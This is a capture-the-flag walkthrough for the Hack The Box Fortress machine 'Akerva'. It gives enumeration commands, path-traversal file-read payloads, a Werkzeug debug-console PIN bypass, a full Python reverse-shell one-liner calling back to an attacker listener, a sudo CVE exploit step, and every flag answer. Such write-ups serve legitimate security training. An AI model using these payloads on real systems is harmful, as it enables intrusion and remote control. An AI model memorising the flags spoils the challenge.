Walkthrough for HTB Fortress (Akerva)

This walkthrough covers the steps to complete the HTB (Hack The Box) Fortress machine, Akerva.
1. Plain Sight

    Scan with Nmap: Run a simple Nmap scan to identify open ports and services on the target machine (10.13.37.11):

    nmap -sC -sV -Pn 10.13.37.11

        Ports: 22, 80, 5000 are open.

    Browse to http://10.13.37.11/: Visiting the website and inspecting the source code reveals Flag 1:

    Flag 1: AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}

2. Take a Look Around

    SNMP Enumeration: Use nmap to check for SNMP (Simple Network Management Protocol) vulnerabilities:

sudo nmap -sU 10.13.37.11

Or use tools like snmp-check or snmpwalk:

    snmp-check -c public -v 2c 10.13.37.11 -d

    Flag 2 from SNMP enumeration:

    Flag 2: AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}

3. Dead Poets

    Files found:
        /dev/space_dev.py
        /var/www/html/scripts/backup_every_17minutes.sh

    Exploit the Backup Script: The script backs up the website every 17 minutes. The backups are stored in the /backups/ folder.

    Using a simple curl request:

    curl -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh

    Flag 3: AKERVA{IKNoW###VeRbTamper!nG_==}

4. Now You See Me

    Investigating the Backup Process:

        The backup script creates a zip file named like backup_$timestamp.zip and stores it in /backups/.

        Determine the time of the server using an HTTP request:

curl -I http://10.13.37.11

Example output:

Date: Mon, 20 Jul 2020 19:51:44 GMT

    Use wfuzz to brute force the backup file name:

wfuzz -u http://10.13.37.11/backups/backup_2020072020FUZZ.zip -w wordlist.txt --hc 404

Generate a wordlist using crunch:

crunch 4 4 0123456789 -o wordlist.txt

    After finding the correct file name, download the file:

    wget http://10.13.37.11/backups/backup_2020072020{4525}.zip

    Check Space_dev.py for credentials (likely for Flag 4): Flag 4: AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}

5. Open Book

    Web Application on Port 5000: After inspecting the source code, use fuzzing techniques (e.g., dirsearch or wfuzz) to find hidden directories and endpoints:

python3 dirsearch.py -u http://10.13.37.11:5000/ -e php

Results reveal three folders:

    /console
    /download
    /file

Exploiting LFI (Local File Inclusion): The /file endpoint can be exploited for LFI by accessing files like /etc/passwd and /home/aas/flag.txt.

Example:

    http://10.13.37.11:5000/file?filename=../../../../../etc/passwd
    http://10.13.37.11:5000/file?filename=../../../../../home/aas/flag.txt

    Flag 5: AKERVA{IKNOW#LFi_@_}

6. Say Friend and Enter

    Werkzeug Console Pin: The /console endpoint prompts for a pin. The machine uses Werkzeug's debug mode, which can be exploited with a script to retrieve the pin.

    Follow the steps provided to generate the pin:
        Get system information (MAC address, machine-id) via LFI.
        Use the information to generate the pin:

python exploit.py

    The key to access the console is: 151-392-393.

Getting Reverse Shell: Once inside the console, initiate a reverse shell back to your listener using the following Python command:

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.37.8",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

On your listener:

nc -lnvp 1234

Use pty for a better shell:

    python -c 'import pty;pty.spawn("/bin/bash")'

    Flag 6: AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}

7. Super Mushroom

    Exploit CVE-2019-18634: The system is running an old version of sudo (1.8.21p2), which is vulnerable to CVE-2019-18634.

    Follow these steps:
        Download and compile the exploit from GitHub.
        Set up a web server to serve the compiled file to the victim machine.
        On the victim machine, use wget to download the file and execute it.

    After successful execution, gain root privileges and get a root shell.

    Flag 7: AKERVA{IkNow_Sud0_sUckS!}

8. Little Secret

    Base64 Decoding: Decoding the string from secured_note.md using CyberChef, you get:

    GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE

    Further decoding with Vigenère cipher gives:

    Flag 8: AKERVA{IKNOOOWVIGEEENERRRE}

Conclusion:

You have completed the HTB Fortress (Akerva) machine by following the steps to gain access to different services, exploit vulnerabilities, and escalate privileges, ultimately obtaining all flags.
